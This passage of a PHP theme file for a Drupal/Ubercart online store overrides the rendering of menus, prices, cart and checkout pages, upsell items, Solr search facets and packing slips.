        $t2_position++;

        // TODO: Add na ID scheme (for faster js and css selection)
        $output .= '      <li class="megamenu-slot megamenu-slot-'. $count_attributes .'">'."\n";
        $output .= '        <h3 class="megamenu-slot-title">'.l($twig['link']['link_title'], $twig['link']['link_path']).'</h3>'."\n";

        if ($twig['below']){
          $output .= '  	 <ul class="megamenu-items '.$slotattributes.'">'."\n";

          $t3_position = 0;
          $leaf_count = count($twig['below']);
          foreach ($twig['below'] as $leaf) {
            $count_attributes = _megamenu_count_attributes($t3_position, $leaf_count);
            $t3_position++;

            $output .= '           <li class="megamenu-item megamenu-item-'.$count_attributes.'">'.l($leaf['link']['link_title'], $leaf['link']['link_path']).'</li>'."\n";
          } // END leaf iteration

          $output .= '  	 </ul>'."\n";
        } // END leaf detection

        $output .= '      </li>'."\n";
      } // END twig iteration

      $output .= '    </ul>'."\n";
    }  // END twig detection

    $output .= '  </li>'."\n";
  } // END branch iteration

  $output .= '</ul>'."\n";

  return $output;
}

/**
 * Wrap the "Add to Cart" form in a <div>.
 *
 * @ingroup themeable
 */
function tendu_uc_product_add_to_cart($node, $teaser = 0, $page = 0) {
  //dpm($node);
  if ($node->field_prod_offline[0][value] == 'true') {
    $output = '<div class="add-to-disabled">' . t('No add to cart now...') . '</div>';
  }
  else {
    $output = '<div class="add-to-cart">';
    if ($node->nid) {
      $output .= drupal_get_form('uc_product_add_to_cart_form_'. $node->nid, $node);
    }
    else {
      $output .= drupal_get_form('uc_product_add_to_cart_form', $node);
    }
	$output .= '</div>';
  }
  return $output;
}

/**
 * Wrap the "$" in a span.
 */
function tendu_uc_price($value, $context, $options) {

if(mb_substr($value,0,1) == '$') {
 $value = '<span class="currency">$</span>' . mb_substr($value,1) ;
}
  // Fixup class names.
  if (!is_array($context['class'])) {
    $context['class'] = array();
  }
  foreach ($context['class'] as $key => $class) {
    $context['class'][$key] = 'uc-price-'. $class;
  }
  $context['class'][] = 'uc-price';
  // Class the element.
  $output = '<span class="'. implode(' ', $context['class']) .'">';
  // Prefix(es).
  if ($options['label'] && isset($options['prefixes'])) {
    $output .= '<span class="price-prefixes">'. implode('', $options['prefixes']) .'</span>';
  }
  // Value.
  $output .= $value;
  // Suffix(es).
  if ($options['label'] && isset($options['suffixes'])) {
    $output .= '<span class="price-suffixes">'. implode('', $options['suffixes']) .'</span>';
  }
  $output .= '</span>';

  return $output;
}

function tendu_breadcrumb($breadcrumb) {
  $res = '<div class="breadcrumb">';
  foreach($breadcrumb as $crumb) {
    if($crumb == end($breadcrumb))  {
	  $res .= '<span class="bread">' . $crumb . '</span>';
	}else{
	  $res .= '<span class="bread">' . $crumb . '</span><span class="seperator"></span>';
	}
    
  }
  
  $res .= '</div>';
  return $res;
}

/**
 * Return a themed ad of type ad_image.
 *
 * @param @ad
 *   The ad object.
 * @return
 *   A string containing the ad markup.
 */
function tendu_ad_image_ad($ad) {
  //dsm($ad);
  if (isset($ad->aid) && (isset($ad->filepath) || isset($ad->remote_image))) {
    $output = '<div class="image-advertisement" id="ad-'. $ad->aid .'">';
    if (isset($ad->url) && !empty($ad->url)) {
      $image = theme('ad_image_image', !empty($ad->remote_image) ? $ad->remote_image : $ad->filepath, check_plain($ad->tooltip), check_plain($ad->tooltip));
      $output .= l($image, $ad->redirect .'/@HOSTID___', array('attributes' => ad_link_attributes(), 'absolute' => TRUE, 'html' => TRUE));
    }
    else {
      $output .= theme('ad_image_image', !empty($ad->remote_image) ? $ad->remote_image : $ad->filepath, check_plain($ad->tooltip), check_plain($ad->tooltip));
    }
    $output .= '</div>';
    return $output;
  }
}

/**
 * Theme function for a CAPTCHA element.
 *
 * Render it in a fieldset if a description of the CAPTCHA
 * is available. Render it as is otherwise.
 */
function tendu_captcha($element) {
  /*if (!empty($element['#description']) && isset($element['captcha_widgets'])) {
    $fieldset = array(
      '#type' => 'fieldset',
      '#title' => t('CAPTCHA'),
      '#description' => $element['#description'],
      '#children' => $element['#children'],
      '#attributes' => array('class' => 'captcha'),
    );
    return theme('fieldset', $fieldset);
  }*/
  //else {
    return '<div class="captcha">'. $element['#children'] .'</div>';
  //}
}

/**
 * Theme function for a fieldset element.
 *
 * Shlomi - http://vincent.polenordstudio.fr/snafu/?p=230.
 */
function tendu_fieldset($element) {
  if (!empty($element['#collapsible'])) {
    drupal_add_js('misc/collapse.js');

    if (!isset($element['#attributes']['class'])) {
      $element['#attributes']['class'] = '';
    }

    $element['#attributes']['class'] .= ' collapsible';
    if (!empty($element['#collapsed'])) {
      $element['#attributes']['class'] .= ' collapsed';
    }
  }

  return '<fieldset id="'. strip_tags(str_replace(" ","-",$element['#title'])). '" '. drupal_attributes($element['#attributes']) .'>'. ($element['#title'] ? '<legend>'. $element['#title'] .'</legend>' : '') . (isset($element['#description']) && $element['#description'] ? '<div class="description">'. $element['#description'] .'</div>' : '') . (!empty($element['#children']) ? $element['#children'] : '') . (isset($element['#value']) ? $element['#value'] : '') ."</fieldset>\n";
}

/**
 * Add markup and styling to the registration form.
 * Shlomi
 * @ingroup themeable
function tendu_user_register($form) {
	dpm($form);
}
 */


/**
 * Theme function to render pane on cart page.
 */
function tendu_pane_upsell($products, $msg = 'Related Products') {
  global $conf;
  if (empty($products)) return '';

  $output = '';
  $output .= '<div id="sub-fp-cart">
	<ul>
		<li><a href="#sub-tabs-1">'. t($msg) .'</a></li>
	</ul>
	<div id="sub-tabs-1">
		<div class="caro-me">';
  foreach ($products as $related) {
    $output .= '<div class="cart-related-item fpt-hider">';
    $output .= theme('upsell_item', $related);
    $output .= '</div>';
  }
  $output .= '   </div>
  		<div class="clearfix"></div>
		<div class="fptabs-cart-buttons">
        <a class="prev" id="pag-cart-prev" href="#"><span>prev</span></a>
	    <a class="next" id="pag-cart-next" href="#"><span>next</span></a>
		</div>
	</div>
</div>';

  return $output;
}

/**
 * Renders upsell item in block or checkout pane.
 */
function tendu_upsell_item($node) {
  
  $testmutation = 7572;
  $istestquery = FALSE;
  $testquery = array();
  if (multivariate_study_is_enabled($testmutation)) {
    $istestquery = TRUE;
    $mutation = multivariate_mutation_get($testmutation);
	
	switch ($mutation[0]) {
	  case 0:
	    $testquery['state'] = (int)0;  
	  break;
	  case 1:
	    $testquery['state'] = (int)1;  
	  break;
	}
  }
  
  $output = '';
  $output .= '<div class="related-item-wrapper">';
  
  $output .= '<div class="views-field-field-image-cache-fid">';
  $img = '<img src="' . imagecache_create_url('frontabs', $node->field_image_cache[0]['filepath']) . '"/>'; 

  if($istestquery && array_key_exists('state',$testquery)) {
    $output .= l($img,'node/' . $node->nid,array('html' => true,'query'=>array('mutationid'=>$testmutation, 'state' => $testquery['state'])));
  }else{
    $output .= l($img,'node/' . $node->nid,array('html' => true));   
  }
  
  $output .= '</div>';
  
  $output .= '<div class="views-field-title">';
  
  if($istestquery && array_key_exists('state',$testquery)) {
    $output .= l($node->title,'node/' . $node->nid, array('query'=>array('mutationid'=>$testmutation, 'state' => $testquery['state']),'attributes' => array('class' => 'buy-related-item'), 'html' => TRUE));
  }else{
    $output .= l($node->title,'node/' . $node->nid, array('attributes' => array('class' => 'buy-related-item'), 'html' => TRUE));
  }
  
  $output .= '</div>';
  
  $output .= '<div class="views-field-sell-price">';
  $output .= '<label class="views-label-sell-price">';
  $output .= t('Price:');
  $output .= '</label>';
  $output .= uc_price($node->sell_price, array('type' => 'amount'));
  $output .= '</div>';
  
  $output .= '</div>';

  // Only show an "add to cart" link if there is a value for Sell Price
  // TODO: Make destination configurable
  $weight = variable_get('uc_product_field_weight', array(
    'image' => -2,
    'display_price' => -1,
    'model' => 0,
    'list_price' => 2,
    'cost' => 3,
    'sell_price' => 4,
    'weight' => 5,
    'dimensions' => 6,
    'add_to_cart' => 10,
  ));

  $product = array(
    '#node' => $node,
  );

  // Only display the list price if the field is configured in Product Settings.
  $enabled = variable_get('uc_product_field_enabled', array(
    'image' => 1,
    'display_price' => 1,
    'model' => 1,
    'list_price' => 0,
    'cost' => 0,
    'sell_price' => 1,
    'weight' => 0,
    'dimensions' => 0,
    'add_to_cart' => 1,
  ));

  $context = array(
    'revision' => 'themed',
    'type' => 'product',
    'class' => array('product'),
    'subject' => array('node' => $node),
  );

  if ($enabled['list_price']) {
    $context['class'][1] = 'list';
    $context['field'] = 'list_price';
    $product['list_price'] = array(
      '#value' => uc_price($node->list_price, $context),
      '#access' => $enabled['list_price'],
      '#weight' => $weight['list_price'],
    );
  }

  $context['class'][1] = 'sell';
  $context['field'] = 'sell_price';
  $product['sell_price'] = array(
    '#value' => uc_price($node->sell_price, $context),
    '#access' => $enabled['display_price'],
    '#weight' => $weight['display_price'],
  );


    $product['add_to_cart'] = array(
      '#value' => theme('uc_product_add_to_cart', $node, TRUE, FALSE),
      '#access' => $enabled['add_to_cart'],
      '#weight' => $weight['add_to_cart'],
    );

  
  drupal_alter('uc_upsell_product', $product);
  $output .= drupal_render($product);
//  $output .= 'test';
  return $output;
}

function tendu_cart_review_table($show_subtotal = TRUE) {
  $subtotal = 0;

  // Set up table header.
  $header = array(
    array('data' => t('Your Items'), 'class' => 'image'),
	array('data' => t(''), 'class' => 'desc'),
	array('data' => t('Item Price'), 'class' => 'itemprice'),
	array('data' => t('Quantity'), 'class' => 'qty'),
    array('data' => t('Price'), 'class' => 'price'),
  );

  $context = array();

  // Set up table rows.
  $contents = uc_cart_get_contents();
  foreach ($contents as $item) {

    $price_info = array(
      'price' => $item->price,
      'qty' => $item->qty,
    );

    $context['revision'] = 'altered';
    $context['type'] = 'cart_item';
    $context['subject'] = array(
      'cart' => $contents,
      'cart_item' => $item,
      'node' => node_load($item->nid),
    );

    $total = uc_price($price_info, $context);
    $subtotal += $total;
    $prodnode = $context['subject']['node'];
    $description = l($prodnode->title,'node/' . $prodnode->nid) . uc_product_get_description($item);

    // Remove node from context to prevent the price from being altered.
    $context['revision'] = 'themed-original';
    $context['type'] = 'amount';
 // dsm($item);
  
    
	unset($context['subject']);
 // dsm($prodnode);
	$prodimg = l('<img src="' . imagecache_create_url('cart', $prodnode->field_image_cache[0]['filepath']) . '"/>','node/' . $prodnode->nid, array('html' => true));
  
    $rows[] = array(
	  array('data' =>  $prodimg, 'class' => 'image'),
	  array('data' =>  $description, 'class' => 'desc'),
      array('data' => t('@qty', array('@qty' => $item->price)), 'class' => 'itemprice'),
      array('data' => t('@qty&times;', array('@qty' => $item->qty)), 'class' => 'qty'),
      array('data' => uc_price($total, $context), 'class' => 'price'),
    );
    unset($prodimg);
  }

  // Add the subtotal as the final row.
  if ($show_subtotal) {
    $context = array(
      'revision' => 'themed-original',
      'type' => 'amount',
    );
    $rows[] = array(
	  'data' => array(
	    array('data' => '<span id="backtocart-link">' . l('Back to cart','cart/') . '</span> ' , 'colspan' => 2, 'class' => 'backtocart-wrapper'),
        array('data' => '<span id="subtotal-title">' . t('Subtotal:') . '</span> ' . uc_price($subtotal, $context), 'colspan' => 3, 'class' => 'subtotal')),
      'class' => 'lastrow',
    );
  }
  $output = '<div class="tableheader">' . t('Currently In Your Shopping Cart') .'</div>';

  return $output . theme('table', $header, $rows, array('class' => 'cart-review'));
}

function tendu_apachesolr_facet_link($facet_text, $path, $options = array(), $count, $active = FALSE, $num_found = NULL) {
  $options['attributes']['class'][] = 'apachesolr-facet';
  if ($active) {
    $options['attributes']['class'][] = 'active';
  }
  $options['attributes']['class'] = implode(' ', $options['attributes']['class']);
  return apachesolr_l($facet_text,  $path, $options) ." ($count)";
}

function tendu_apachesolr_facet_list($items, $display_limit = 0) {
  // theme('item_list') expects a numerically indexed array.
  $items = array_values($items);
  // If there is a limit and the facet count is over the limit, hide the rest.
  if (($display_limit > 0) && (count($items) > $display_limit)) {
    // Show/hide extra facets.
    drupal_add_js(drupal_get_path('module', 'apachesolr') . '/apachesolr.js');
    // Split items array into displayed and hidden.
    $hidden_items = array_splice($items, $display_limit);
    foreach ($hidden_items as $hidden_item) {
      if (!is_array($hidden_item)) {
        $hidden_item = array('data' => $hidden_item);
      }
      $hidden_item['class'] = isset($hidden_item['class']) ? $hidden_item['class'] . ' apachesolr-hidden-facet' : 'apachesolr-hidden-facet';
      $items[] = $hidden_item;
    }
  }
  $admin_link = '';
  if (user_access('administer search')) {
    $admin_link = l(t('Configure enabled filters'), 'admin/settings/apachesolr/enabled-filters');
  }
  return theme('item_list', $items) . $admin_link;
}

function tendu_apachesolr_sort_link($text, $path, $options = array(), $active = FALSE, $direction = '') {
  //dsm($text);
  //dsm($path);
  //dsm($options);
  $icon = '';
  if ($direction) {
    $icon = ' '. theme('tablesort_indicator', $direction);
  }
  if ($active) {
    if (isset($options['attributes']['class'])) {
      $options['attributes']['class'] .= ' active';
    }
    else {
      $options['attributes']['class'] = 'active';
    }
  }
  return $icon . apachesolr_l($text, $path, $options);
}

function tendu_apachesolr_sort_list($items) {
  //dsm($items);
  // theme('item_list') expects a numerically indexed array.
  //$items = array_values($items);
  //return theme('item_list', $items);
  //dsm($items);
  //drupal_add_css('sites/all/modules/cpo_rcm_special/tablesort.css','theme');
  //drupal_add_js('sites/all/modules/cpo_rcm_special/sortlist.js','theme');
  $return = '<dl class="sortbydrop"><dt><a href="#"><span>Select sorting</span></a></dt><dd><ul>';
  foreach ($items as $key => $value) {
    $return .= '<li>' . $value . '</li>';
  }
  $return .= '</ul></dd></dl>';
  return $return;
}

/**
 * Return current search block contents
 */
function tendu_apachesolr_currentsearch($total_found, $links) {
  //$total_found == 1 ? $items = 'item' : $items = 'items';
  //$return = '<h2>Current Search</h2>';
  //$return .= '<div class="search-found">Found <span>' . $total_found . '</span> results</div>';
  $return .= '<div class="search-facet-title">' . t('You\'ve selected') . '</div>';
  $return .= '<div class="search-facet-links">' . theme_item_list($links) . '</div>';
  //$return .= '<div class="search-side-facet-bottom"></div>';
  return $return;
}

/**
 * Process variables for search-result.tpl.php.
 *
 * The $variables array contains the following arguments:
 * - $result
 * - $type
 *
 * @see search-result.tpl.php
 */
function tendu_preprocess_search_result(&$variables) {
  //dpm($result);
  //dpm($variables);
  $result = $variables['result'];
  
  $variables['nid'] = $result['fields']['nid'];
  
  

  $variables['url'] = check_url($result['link']);
  $variables['title'] = check_plain($result['title']);

  $info = array();
  if (!empty($result['type'])) {
    $info['type'] = check_plain($result['type']);
  }
  if (!empty($result['user'])) {
    $info['user'] = $result['user'];
  }
  if (!empty($result['date'])) {
    $info['date'] = format_date($result['date'], 'small');
  }
  if (isset($result['extra']) && is_array($result['extra'])) {
    $info = array_merge($info, $result['extra']);
  }
  // Check for existence. User search does not include snippets.
  $variables['snippet'] = isset($result['snippet']) ? $result['snippet'] : '';
  // Provide separated and grouped meta information..
  $variables['info_split'] = $info;
  $variables['info'] = implode(' - ', $info);
  // Provide alternate search result template.
  $variables['template_files'][] = 'search-result-'. $variables['type'];
}


/**
 * Add markup and styling to the checkout panes.
 *
 * @ingroup themeable
 * @see uc_cart_checkout_form()
 */
function tendu_uc_cart_checkout_form($form) {
  drupal_add_css(drupal_get_path('module', 'uc_cart') .'/uc_cart.css');

  $output = '<div id="checkout-instructions">'. check_markup(variable_get('uc_checkout_instructions', ''), variable_get('uc_checkout_instructions_format', FILTER_FORMAT_DEFAULT), FALSE) .'</div>';

  foreach (element_children($form['panes']) as $pane_id) {
    if (function_exists(($func = _checkout_pane_data($pane_id, 'callback')))) {
      $result = $func('theme', $form['panes'][$pane_id], NULL);
      if (!empty($result)) {
        $output .= $result;
        $form['panes'][$pane_id] = array();
      }
      else {
        $output .= drupal_render($form['panes'][$pane_id]);
      }
    }
    else {
      $output .= drupal_render($form['panes'][$pane_id]);
    }
  }

/* Shlomi - change to Mailchimp - using uc_mailchimp module */
//  $output .= '<div id="checkout-form-bottom"><div class="cfb-left"><div class="cfb-l-left"><input id="signup-newsletter" class="cfb-che" type="checkbox" value="1" name="" checked="yes"></div><div class="cfb-l-right"><div class="cfb-l-title">Signup for the Israel-Catalog.com newsletter</div><div class="cfb-l-text">Yes, please sign me up for the newletter, containing informatrion about new brands, sale and special on the website.</div></div></span></div>'. drupal_render($form) .'<div class="cfb-right"></div></div>';
  $output .= '<div id="checkout-form-bottom">'. drupal_render($form) .'<div class="cfb-right"></div></div>';
$output .= '<script type="text/javascript"> var myHTML = document.getElementById("edit-panes-uc-mailchimp-subscribe-uc-mailchimp-subscribe-1d0ecc628a-wrapper").innerHTML; myHTML = myHTML.replace(" name"," CHECKED name"); document.getElementById("edit-panes-uc-mailchimp-subscribe-uc-mailchimp-subscribe-1d0ecc628a-wrapper").innerHTML = myHTML; </script>';

  return $output;
}

/**
 * Theme the table listing the items in the shopping cart block.
 *
 * @param $items
 *   An associative array of item information containing the keys 'qty',
 *      'title', 'price', and 'desc'.
 * @ingroup themeable
 */
function tendu_uc_cart_block_items($items) {
  // If there are items in the shopping cart...
  if ($items) {
    $output = '<table class="cart-block-items"><tbody>';
    $row_class = 'odd';

    $context = array(
      'revision' => 'themed',
      'type' => 'price',
    );

    // Loop through each item.
    foreach ($items as $item) {
      $context['subject'] = array(
        'cart_item' => $item,
        'node' => node_load($item->nid),
      );
      // Add the basic row with quantity, title, and price.
      $output .= '<tr class="'. $row_class .'"><td class="cart-block-item-qty">'. $item['qty'] .'</td>'
                .'<td class="cart-block-item-title">'. $item['title'] .'</td>'
                .'<td class="cart-block-item-price">'. uc_price($item['price'], $context) .'</td></tr>';

      // Add a row of description if necessary.
      if ($item['desc']) {
        $output .= '<tr class="'. $row_class .'"><td colspan="3" class="cart-block-item-desc">'. $item['desc'] .'</td></tr>';
      }

      // Alternate the class for the rows.
      $row_class = ($row_class == 'odd') ? 'even' : 'odd';
    }

    $output .= '</tbody></table>';
  }
  else {
    // Otherwise display an empty message.
    $output = '<p>'. variable_get('cpo_isr_more_empty_cart', 'There are no products in your shopping cart..') .'</p>';
  }

  return $output;
}

/**
 * Return the text displayed for an empty shopping cart.
 *
 * @ingroup themeable
 */
function tendu_uc_empty_cart() {
  return '<p>'. variable_get('cpo_isr_more_empty_cart', 'There are no products in your shopping cart..') .'</p>';
}

function tendu_apachesolr_unclick_link($facet_text, $path, $options = array()) {
  if (empty($options['html'])) {
    $facet_text = check_plain($facet_text);
  }
  else {
    // Don't pass this option as TRUE into apachesolr_l().
    unset($options['html']);
  }
  if (strpos($facet_text, '[') == 0) {
    $trans = array("[" => "$", "TO " => "- $", "]" => "");
    $facet_text = strtr($facet_text, $trans);
  }
  $options['attributes']['class'] = 'apachesolr-unclick';
  return apachesolr_l("(X)", $path, $options) . ' '. $facet_text;
}


function tendu_uc_cart_checkout_review($panes, $form) {
  drupal_add_css(drupal_get_path('module', 'uc_cart') .'/uc_cart.css');
  //global $user;
  //$output = check_markup(variable_get('uc_checkout_review_instructions', uc_get_message('review_instructions')), variable_get('uc_checkout_review_instructions_format', FILTER_FORMAT_DEFAULT), FALSE)
  //         .'<div class="order-review-table custom-review-table"><div class="rev-top"></div><div class="rev-middle">';
  //if ($user->uid == 1) {
		   $output = check_markup(variable_get('uc_checkout_review_instructions', uc_get_message('review_instructions')), variable_get('uc_checkout_review_instructions_format', FILTER_FORMAT_DEFAULT), FALSE)
            .'<div class="rev-top-top">' . $form . '<div class="br-text">' . variable_get('cpo_isr_special_review_text', t('Please press "Submit My Order" only once. Your payment method will be charged.')) . '</div></div>'
            .'<div class="order-review-table custom-review-table"><div class="rev-top"></div><div class="rev-middle">';
  //}
  foreach ($panes as $title => $data) {
    $output .= '<div class="review-pane"><div class="pane-title-row">'. $title
              .'</div></div>';
    if (is_array($data)) {
      foreach ($data as $row) {
        if (is_array($row)) {
          $output .= '<div class="rev-title"><div class="rev-label">'. $row['title'] .':</div><div class="rev-data">'
                   . $row['data'] .'</div></div>';
        }
        else {
		  //dpm($row);
          $output .= '<div class="rev-row">'. $row .'</div>';
        }
      }
    }
    else {
      $output .= '<div class="rev-something">'. $data .'</div>';
    }
  }

  $output .= '</div><div class="rev-bottom"></div><div class="rev-b-w"><div class="rev-buttons">' . $form . '</div></div></div><div class="br-text">' . variable_get('cpo_isr_special_review_text', t('Please press "Submit My Order" only once. Your payment method will be charged.')) . '</div>';

  return $output;
}

function tendu_menu_item_link($link) {
  //global $user;
  //if ($user->uid == 1 && $link['menu_name'] == 'secondary-links') {
  if ($link['menu_name'] == 'secondary-links' && $link['link_title'] == 'Learn') {
    //dpm($link);
	//$options = array('attributes' => array('target' => '_blank'));
	$link['localized_options']['attributes']['target'] = '_blank';
  }

  return l($link['title'], $link['href'], $link['localized_options']);
}

/**
 * Render an icon to display in the Administration Menu.
 *
 * @ingroup themeable
 */
function tendu_admin_menu_icon() {
  // ssl?
  $ht = 'http';
  if (arg(0) == 'cart' && arg(1)) {
    $ht .= 's';
  }
  return '<img class="admin-menu-icon more-class" src="'. $ht .'://cdn3.israel-catalog.com/sites/default/files/tendu_default_favicon.png" width="16" height="16" alt="'. t('Home') .'" />';
}

function tendu_preprocess_uc_packing_slip(&$variables) {
  $tokens = uc_store_token_values('global');
  $variables['site_logo'] = $tokens['site-logo'];
  $variables['store_name'] = $tokens['store-name'];
  $variables['store_address'] = $tokens['store-address'];
  $variables['store_phone'] = $tokens['store-phone'];

  $order = $variables['order'];
  $variables['order_link'] = l($order->order_id, url('user/'. $order->uid .'/order/'. $order->order_id, array('absolute' => TRUE)));
  $variables['order_email'] = check_plain($order->primary_email);
  $variables['billing_address'] = uc_order_address($order, 'billing');
  $variables['billing_phone'] = check_plain($order->billing_phone);
  $variables['shipping_address'] = uc_order_address($order, 'delivery');
  $variables['shipping_phone'] = check_plain($order->delivery_phone);

  if (module_exists('uc_payment')) {
    $tokens = uc_payment_token_values('order', $order);
    $variables['payment_method'] = $tokens['order-payment-method'];
  }
  else {
    $variables['payment_method'] = '';
  }

  $shipment = $variables['shipment'];
  $variables['carrier'] = check_plain($shipment->carrier);
  $variables['tracking_number'] = check_plain($shipment->tracking_number);
  $variables['packages'] = $shipment->packages;
  $variables['ship_type'] = check_plain(db_result(db_query("SELECT title FROM uc_order_line_items WHERE order_id=%d AND type='shipping'", $order->order_id)));
  $variables['allorder'] = check_plain($order->billing_first_name . ' ' . $order->billing_last_name);
  $variables['shiptype'] = 'NO';
}
